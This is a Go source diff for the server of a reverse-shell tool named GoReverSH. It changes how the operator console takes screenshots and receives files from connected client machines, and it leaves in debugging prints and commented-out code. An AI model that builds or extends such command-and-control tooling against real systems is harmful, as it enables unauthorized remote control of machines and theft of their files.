@@ -1,14 +1,12 @@
 package server
 
 import (
-	"GoReverSH/utils"
 	"context"
-	"encoding/json"
 	"fmt"
-	"io"
 	"log"
 	"net"
 	"os"
+	"strconv"
 	"strings"
 	"sync"
 )
@@ -54,7 +52,7 @@ func (observer Observer) WaitNotice(ctx context.Context) error {
 				observer.printPrompt()
 
 			case MESSAGE:
-				fmt.Printf("\n%s\n", notice.Message)
+				fmt.Printf("\n%s\n", notice.Output.Message)
 				observer.printPrompt()
 
 				//30
@@ -64,27 +62,38 @@ func (observer Observer) WaitNotice(ctx context.Context) error {
 
 				//29
 			case DOWNLOAD:
-				observer.Lock.Lock()
 				fmt.Println("DOWNLOAD")
-
-				observer.Lock.Unlock()
 				observer.printPrompt()
 
 				//28
 			case SCREEN_SHOT:
-				observer.Lock.Lock()
 				fmt.Println("SCREENSHOT")
 				observer.Sender.SendMessage(notice.Command)
+				observer.printPrompt()
 
-				//ファイル名
-				//画像を受け取り
-				err := downloadFiles(observer.Sender.connectingClient.Conn)
-				if err != nil {
-					log.Fatalln(err)
+			case CREATE_FILE:
+				filePath := strings.Split(notice.Output.FileInfo.Name, "/")
+				lastPathFromRecievedFile := strings.Join(filePath[:len(filePath)-1], "/")
+				outdir := "./output/" + notice.Client.Name + "/" //config
+
+				//dir作成
+				if _, err := os.Stat(outdir + lastPathFromRecievedFile); os.IsNotExist(err) {
+					if err2 := os.MkdirAll(outdir+lastPathFromRecievedFile, 0755); err2 != nil {
+						log.Fatalf("Could not create the path %s", outdir+lastPathFromRecievedFile)
+					}
 				}
 
-				observer.Lock.Unlock()
-				fmt.Println("finished")
+				f, err := os.Create(outdir + notice.Output.FileInfo.Name)
+				if err != nil {
+					log.Println(err)
+					continue
+				}
+				f.WriteString(string(notice.Output.FileInfo.Body))
+				f.Close()
+				observer.printPrompt()
+
+			case MAKE_DIR:
+				fmt.Println("make dir")
 				observer.printPrompt()
 
 				//30
@@ -101,7 +110,7 @@ func (observer Observer) WaitNotice(ctx context.Context) error {
 
 func (o Observer) printPrompt() {
 	if o.Sender.connectingClient != nil {
-		fmt.Printf("[GoReverSH@%s] >", o.Sender.connectingClient.Name)
+		fmt.Printf("\n[GoReverSH@%s] >", o.Sender.connectingClient.Name)
 	} else {
 		fmt.Println("wait...")
 	}
@@ -114,40 +123,65 @@ func (o Observer) printPrompt() {
 //サイズ0、名前空、中身なしの場合終了
 func downloadFiles(conn net.Conn) error {
 	for {
-		output := utils.Output{}
+		fmt.Println(1)
+		bufferFileName := make([]byte, 64)
+		bufferFileSize := make([]byte, 10)
+		conn.Read(bufferFileSize)
+		fmt.Println(string(bufferFileSize))
+		fileSize, _ := strconv.ParseInt(strings.Trim(string(bufferFileSize), ":"), 10, 64)
 
-		fileInfoBuff := make([]byte, 1024)
-		n, err := conn.Read(fileInfoBuff)
-		if err != nil {
-			log.Fatalln(err)
-			break
+		if fileSize == 0 {
+			//break
 		}
 
-		data := strings.Trim(string(fileInfoBuff[:n]), ":")
+		fmt.Println(2)
+		conn.Read(bufferFileName)
+		fileName := strings.Trim(string(bufferFileName), ":")
 
-		//err := json.NewDecoder(conn).Decode(&output)
-		fmt.Println(string(data))
-		err = json.Unmarshal([]byte(data), &output)
-		if err != nil {
-			log.Fatalln(err)
-			break
-		}
-		fmt.Println(output)
+		fmt.Println(fileName, fileSize)
+		/*
+			fileInfoBuff := make([]byte, 1024)
+			fmt.Println(1)
+			n, err := conn.Read(fileInfoBuff)
+			fmt.Println(1)
+			fmt.Println(1)
+			output := utils.Output{}
+			fmt.Println(n)
+			if err != nil {
+				log.Fatalln(err)
+				break
+			}
 
-		if output.Type == utils.FIN {
-			log.Fatal()
-			break
-		}
+			fmt.Println(2)
+			data := strings.Trim(string(fileInfoBuff[:n]), ":")
 
-		//TODO 出力フォルダは設定ファイルに記載
-		outdir := "./output/"
-		f, err := os.Create(outdir + output.FileInfo.Name)
-		if err != nil {
-			log.Fatalln(err)
-			break
-		}
+			//err := json.NewDecoder(conn).Decode(&output)
+			fmt.Println("data:", string(data))
+			err = json.Unmarshal([]byte(data), &output)
+			if err != nil {
+				log.Fatalln(err)
+				break
+			}
+			fmt.Println(output)
+
+			if output.Type == utils.FIN {
+				break
+			}
+
+			fmt.Println(3)
+		*/
 
 		/*
+			//TODO 出力フォルダは設定ファイルに記載
+			outdir := "./output/"
+			f, err := os.Create(outdir + output.FileInfo.Name)
+			if err != nil {
+				log.Fatalln(err)
+				break
+			}
+
+			fmt.Println(4)
+
 			var content []byte
 			buff := make([]byte, 1024)
 			size := 0
@@ -165,12 +199,16 @@ func downloadFiles(conn net.Conn) error {
 		*/
 
 		//fileInfoのWriteが消されてしまう
-		_, err = io.Copy(f, conn)
-		if err != nil {
-			break
-		}
+		/*
+			_, err = io.Copy(f, conn)
+			if err != nil {
+				break
+			}
+		*/
+		fmt.Println(4)
 
-		f.Close()
+		//f.Close()
+		fmt.Println("Close")
 	}
 	return nil
 }
